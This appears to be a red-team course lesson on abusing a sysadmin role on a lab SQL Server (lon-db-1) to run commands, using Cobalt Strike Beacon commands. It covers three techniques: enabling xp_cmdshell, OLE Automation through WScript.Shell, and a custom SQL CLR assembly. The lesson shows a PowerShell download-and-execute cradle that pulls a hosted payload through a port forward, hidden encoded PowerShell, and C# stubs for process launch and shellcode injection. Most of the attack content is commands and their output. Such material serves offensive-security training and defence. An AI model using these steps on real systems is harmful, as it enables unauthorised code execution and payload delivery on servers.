
We may run into a scenario where we have access to one or more user accounts that do not have local admin privileges on the SQL server itself, but they do have a privileged SQL role, such as sysadmin.  There are multiples techniques by which we can abuse that access get code execution on the server via the SQL instance.

Unfortunately, there's not much we can do to abuse a SQL instance without sysadmin privileges.  Each of the techniques discussed in this lesson are disabled by default on new SQL server installations, but they can be enabled by a sysadmin.

### xp_cmdshell

The `xp_cmdshell` stored procedure is probably the most well known method for executing commands via a SQL server.  It spawns a command shell, passes the string for execution, and returns any output as rows of text.  The SQL syntax is simply:

```sql
EXEC xp_cmdshell '<command>';
```

> The command string can't contain more than one set of double quotation marks, and a single pair of quotation marks is required if any spaces are present.

First, we query the server to see if xp_cmdshell is already enabled using `sql-query`.

```powershell
beacon> sql-query lon-db-1 "SELECT name,value FROM sys.configurations WHERE name = 'xp_cmdshell'"

[*] Connecting to lon-db-1:1433
[+] Successfully connected to database
[*] Executing custom query on lon-db-1

name | value | 
---------------
xp_cmdshell | 0 |

[*] Disconnecting from server
```

A value of `0` means it's disabled, so enable it using the `sql-enablexp` command.  This works by running an [sp_configure](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-configure-transact-sql) query.

```powershell
beacon> sql-enablexp lon-db-1

[*] Connecting to lon-db-1:1433
[+] Successfully connected to database
[*] Toggling xp_cmdshell on lon-db-1...

name | value_in_use | 
----------------------
xp_cmdshell | 1 | 

[*] Disconnecting from server
```

Now, we can execute commands on the server.  These are executed under the context of the principal running the _sqlservr_ process, which is typically SYSTEM or a service account.

```powershell
beacon> sql-xpcmd lon-db-1 "hostname && whoami"

[*] Connecting to lon-db-1:1433
[+] Successfully connected to database
[*] xp_cmdshell is enabled
[*] Executing system command...

output | 
---------
lon-db-1 | 
contoso\mssql_svc | 
 | 
```

> xp_cmdshell is the only execution technique that can return output.

If you have to enable a procedure such as xp_cmdshell, you should always disable it again afterwards.  This can be done with the `sql-disablexp` command.

```powershell
beacon> sql-disablexp lon-db-1
```

### OLE Automation

Object Linking and Embedding (OLE) is a technology that allows one application to link objects into another application.  It was originally designed for Microsoft Office (e.g. to embed Excel sheets into Word documents) and eventually became the foundation for the Component Object Model (COM).  OLE Automation enables a SQL server to interact with arbitrary COM objects via the following stored procedures:

- **[sp_OACreate](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-oacreate-transact-sql)** - Creates an instance of an OLE object.
    
- **[sp_OADestroy](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-oadestroy-transact-sql)** - Destroys a created OLE object.
    
- **[sp_OAGetErrorInfo](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-oageterrorinfo-transact-sql)** - Obtains OLE Automation error information.
    
- **[sp_OAGetProperty](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-oagetproperty-transact-sql)** - Gets a property value of an OLE object.
    
- **[sp_OAMethod](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-oamethod-transact-sql)** - Calls a method of an OLE object.
    
- **[sp_OASetProperty](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-oasetproperty-transact-sql)** - Sets a property of an OLE object to a new value.
    
- **[sp_OAStop](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-oastop-transact-sql)** - Stops the OLE Automation stored procedure execution environment.
    

This can be abused in a number of ways depending on which COM object you choose to interact with.  For example, ScriptControl can be used to execute arbitrary JS or VBS; and WbemScripting can interact with WMI to spawn processes.  The `sql-olecmd` BOF uses WScript.Shell to run shell commands.

Check that OLE Automation is enabled.

```powershell
beacon> sql-query lon-db-1 "SELECT name,value FROM sys.configurations WHERE name = 'Ole Automation Procedures'"

[*] Connecting to lon-db-1:1433
[+] Successfully connected to database
[*] Executing custom query on lon-db-1

name | value | 
---------------
Ole Automation Procedures | 0 | 

[*] Disconnecting from server
```

And enable it using the `sql-enableole` command.

```powershell
beacon> sql-enableole lon-db-1

[*] Connecting to lon-db-1:1433
[+] Successfully connected to database
[*] Toggling Ole Automation Procedures on lon-db-1...

name | value_in_use | 
----------------------
Ole Automation Procedures | 1 | 

[*] Disconnecting from server
```

Then use `sql-olecmd` to run a command.  As previously stated, OLE cannot return output like xp_cmdshell can, so it's "limited" to executing one-liners.

```powershell
beacon> sql-olecmd lon-db-1 "cmd /c calc"

[*] Connecting to lon-db-1:1433
[+] Successfully connected to database
[*] OLE Automation Procedures is enabled
[*] Executing system command...

[*] Setting sp_oacreate to "lfdfjzuv"
[*] Setting sp_oamethod to "enijbgqg"
[*] Command executed
[*] Destoryed "lfdfjzuv" and "enijbgqg"

[*] Disconnecting from server```

One way to leverage this is to use a PowerShell one-liner to pull and execute a payload through a reverse port forward.  This is often required when exploiting servers because they're typically restricted from sending traffic outside of the network boundary.  Host a payload on Cobalt Strike's web server, e.g. via the scripted web delivery (**Attacks > Scripted Web Delivery**), and manually create a PowerShell one-liner to grab it through the reverse port forward.  For example:

```powershell
PS C:\Users\Attacker> $cmd = 'iex (new-object net.webclient).downloadstring("http://lon-wkstn-1:8080/b")'
PS C:\Users\Attacker>[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
```

Then execute the one-liner on the target.

```powershell
beacon> sql-olecmd lon-db-1 "cmd /c powershell -w hidden -nop -enc [ONE-LINER]"

[*] Connecting to lon-db-1:1433
[+] Successfully connected to database
[*] OLE Automation Procedures is enabled
[*] Executing system command...

[*] Setting sp_oacreate to "tltsphje"
[*] Setting sp_oamethod to "ckilexuf"
[*] Command executed
[*] Destoryed "tltsphje" and "ckilexuf"

[*] Disconnecting from server
```

Open the web log (**View > Web Log**) and you should see a hit for the hosted payload.  If not, go back and check things like your reverse port forward and firewall rule.

```powershell
04/06 15:16:43 visit (port 80) from: 127.0.0.1
	Request: GET /b
	page Scripted Web Delivery (powershell)
	null
```

You should then be able to link to the new Beacon.

```powershell
beacon> link lon-db-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
[+] established link to child beacon: 10.10.120.20
```

Finally, return OLE Automation to its original state.

```powershell
beacon> sql-disableole lon-db-1
```

### SQL Common Language Runtime

SQL Server 2005 introduced a feature called SQL Common Language Runtime (CLR), which integrated the .NET Framework.  This allows stored procedures to be written in any managed .NET language (such as C# and VB.NET) and registered with the database.  Thereafter, they can be invoked like any normal procedure.

For a method written in C# to be compatible with SQL CLR, it must be in a partial class called  _StoredProcedures_ and decorated with the [SqlProcedureAttribute](https://learn.microsoft.com/en-us/dotnet/api/microsoft.sqlserver.server.sqlprocedureattribute).  For example:

```C#
public partial class StoredProcedures
{
    [SqlProcedure]
    public static void MyProcedure()
    {
        // my code here
    }
}
```

Since you can write practically any arbitrary C#, the sky's the limit in what you can do here.  For example, use the [System.Diagnostics](https://learn.microsoft.com/en-us/dotnet/api/system.diagnostics) namespace to run PowerShell like in the previous example:

```c#
public partial class StoredProcedures
{
    [SqlProcedure]
    public static void MyProcedure()
    {
        var psi = new ProcessStartInfo
        {
            FileName = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            Arguments = "-w hidden -nop -enc ..."
        };
        
        Process.Start(psi);
    }
}
```

Or write a complete shellcode injector via P/Invoke and one of the previously-shown [injection patterns](https://www.zeropointsecurity.co.uk/path-player?courseid=red-team-ops&unit=67e93b6eebe539b1980ef449).

```c#
public partial class StoredProcedures
{
    [SqlProcedure]
    public static void MyProcedure()
    {
        // VirtualAlloc
        // WriteProcessMemory
        // CreateThread
    }
}
```

Check if SQL CLR is enabled, and enable it if required using `sql-enableclr`.

```powershell
beacon> sql-query lon-db-1 "SELECT value FROM sys.configurations WHERE name = 'clr enabled'"

[*] Connecting to lon-db-1:1433
[+] Successfully connected to database
[*] Executing custom query on lon-db-1

value | 
--------
0 | 

[*] Disconnecting from server

beacon> sql-enableclr lon-db-1

[*] Connecting to lon-db-1:1433
[+] Successfully connected to database
[*] Toggling clr enabled on lon-db-1...

name | value_in_use | 
----------------------
clr enabled | 1 | 

[*] Disconnecting from server
```

Now load and execute the assembly using `sql-clr`.

```powershell
beacon> sql-clr lon-db-1 C:\Users\Attacker\source\repos\ClassLibrary1\bin\Release\ClassLibrary1.dll MyProcedure

[*] Connecting to lon-db-1:1433
[+] Successfully connected to database
[*] Performing CLR custom assembly attack on lon-db-1

[*] CLR is enabled
[!] Error fetching results
[*] Assembly hash does not exist (error fetching result normal)
[*] Added SHA-512 hash for DLL to sys.trusted_assemblies with the name "spijufut"
[*] Creating a new custom assembly with the name "sockuoyl"
[*] Loading DLL into stored procedure "MyProcedure"
[*] Created "[sockuoyl].[StoredProcedures].[MyProcedure]"
[*] Executing payload...
[*] Cleaning up...

[*] Disconnecting from server

beacon> link lon-db-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
[+] established link to child beacon: 10.10.120.20
```

![[Pasted image 20250723092300.png]]

Finally, set SQL CLR back to disabled using `sql-disableclr`.

```powershell
beacon> sql-disableclr lon-db-1
```